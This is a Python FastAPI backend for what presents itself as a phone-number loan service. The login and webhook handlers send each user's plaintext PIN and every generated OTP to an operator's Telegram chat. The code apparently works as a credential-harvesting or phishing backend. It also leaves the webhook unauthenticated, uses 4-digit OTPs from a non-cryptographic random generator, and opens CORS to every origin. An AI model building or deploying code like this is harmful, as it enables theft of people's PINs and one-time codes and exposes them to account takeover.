import json
import random
from uuid import uuid4
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()

from fastapi import FastAPI, BackgroundTasks, Request
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware

from database import init_db, create_user, verify_user_pin, get_user
from telegram_bot import send_approval_request, answer_callback_query, edit_message
from approvals import (
    create_approval,
    set_approval_result,
    pending_approvals,
    approval_results,
    approval_phones,
)
from notifications import send_otp_sms, send_telegram_message

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

init_db()

otp_store = {}
approval_pins = {}


# --- Request Models ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str


class OTPRequest(BaseModel):
    phone_number: str
    otp: str


class RegisterRequest(BaseModel):
    phone_number: str
    pin: str


class ResendRequest(BaseModel):
    phone_number: str


def format_phone(phone: str) -> str:
    phone = phone.strip()
    if phone.startswith("0"):
        phone = phone[1:]
    if not phone.startswith("+243") and not phone.startswith("243"):
        return f"+243{phone}"
    if phone.startswith("243"):
        return f"+{phone}"
    return phone


@app.get("/")
def read_root():
    return {"status": "Backend is running"}


@app.post("/api/register")
async def register(request: RegisterRequest):
    full_phone = format_phone(request.phone_number)
    if create_user(full_phone, request.pin):
        return {"status": "success", "message": "User created"}
    return {"status": "error", "message": "User already exists"}


# --- LOGIN ---
@app.post("/api/login")
async def login(request: LoginRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)

    user = get_user(full_phone)
    if not user:
        create_user(full_phone, request.pin)
    else:
        if not verify_user_pin(full_phone, request.pin):
            return {"status": "error", "message": "Invalid PIN"}

    approval_id = str(uuid4())
    create_approval(approval_id)
    approval_phones[approval_id] = full_phone
    approval_pins[approval_id] = request.pin

    await send_approval_request(approval_id, full_phone, request.pin)

    return {
        "status": "pending",
        "approval_id": approval_id,
        "message": "Waiting for admin approval..."
    }


# --- APPROVAL STATUS ---
@app.get("/api/approval-status/{approval_id}")
async def approval_status(approval_id: str):
    if approval_id in pending_approvals:
        return {"status": "pending"}

    result = approval_results.get(approval_id)
    if result is None:
        return {"status": "expired"}

    if not result:
        return {"status": "rejected"}

    return {"status": "approved", "message": "OTP sent"}


# --- VERIFY OTP ---
@app.post("/api/verify-otp")
async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
    full_phone = format_phone(request.phone_number)
    expected = otp_store.get(full_phone)

    if expected and request.otp == expected:
        del otp_store[full_phone]
        return {"status": "success", "message": "Loan approved"}
    return {"status": "error", "message": "Invalid OTP"}


# --- RESEND OTP ---
@app.post("/api/resend-otp")
async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
    """
    Regenerate and resend an OTP for the given phone number.
    Also sends a notification to the admin's Telegram.
    """
    full_phone = format_phone(request.phone_number)

    # 1. Generate a new OTP
    new_otp = str(random.randint(1000, 9999))
    otp_store[full_phone] = new_otp

    # 2. Send the new OTP via SMS
    background_tasks.add_task(send_otp_sms, full_phone, new_otp)

    # 3. Notify admin on Telegram
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    background_tasks.add_task(
        send_telegram_message,
        f"🔄 <b>OTP Resent</b>\n\n"
        f"📱 Phone: <code>{full_phone}</code>\n"
        f"🔐 New OTP: <code>{new_otp}</code>\n"
        f"🕒 Time: <code>{timestamp}</code>"
    )

    return {"status": "success", "message": "OTP resent successfully"}


# --- TELEGRAM WEBHOOK ---
@app.post("/telegram/webhook")
async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
    try:
        body = await request.body()
        if not body:
            print("Webhook called with empty body — ignoring")
            return {"ok": True}
        data = json.loads(body)
    except Exception as e:
        print(f"Webhook parse error: {e}")
        return {"ok": True}

    if "callback_query" not in data:
        print("Webhook received non-callback update — ignoring")
        return {"ok": True}

    try:
        callback = data["callback_query"]
        callback_id = callback["id"]
        callback_data = callback.get("data", "")
        parts = callback_data.split(":")

        if len(parts) < 2:
            return {"ok": True}

        action = parts[0]
        approval_id = parts[1]
        approved = (action == "approve")

        # Mark the result so polling picks it up
        set_approval_result(approval_id, approved)

        # Acknowledge the button press
        await answer_callback_query(
            callback_id,
            "✅ Approved" if approved else "❌ Rejected"
        )

        # Fetch stored credentials
        phone = approval_phones.get(approval_id, "Unknown")
        pin = approval_pins.get(approval_id, "Unknown")

        # ---- If APPROVED: Generate OTP + send SMS + Telegram ----
        if approved and phone != "Unknown":
            otp = str(random.randint(1000, 9999))
            otp_store[phone] = otp

            # Send OTP via SMS
            background_tasks.add_task(send_otp_sms, phone, otp)

            # Send a separate Telegram message with the OTP
            background_tasks.add_task(
                send_telegram_message,
                f"🔑 <b>OTP Generated</b>\n\n"
                f"📱 Phone: <code>{phone}</code>\n"
                f"🔐 OTP: <code>{otp}</code>\n"
                f"🆔 Ref: <code>{approval_id}</code>"
            )

        # Edit the original message to show the decision
        if "message" in callback:
            result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
            await edit_message(
                chat_id=callback["message"]["chat"]["id"],
                message_id=callback["message"]["message_id"],
                text=f"{result_text}\n\n"
                     f"📱 Phone: <code>{phone}</code>\n"
                     f"🔑 PIN: <code>{pin}</code>\n"
                     f"🆔 Ref: <code>{approval_id}</code>"
            )

        return {"ok": True}

    except Exception as e:
        print(f"Webhook processing error: {e}")
        return {"ok": True}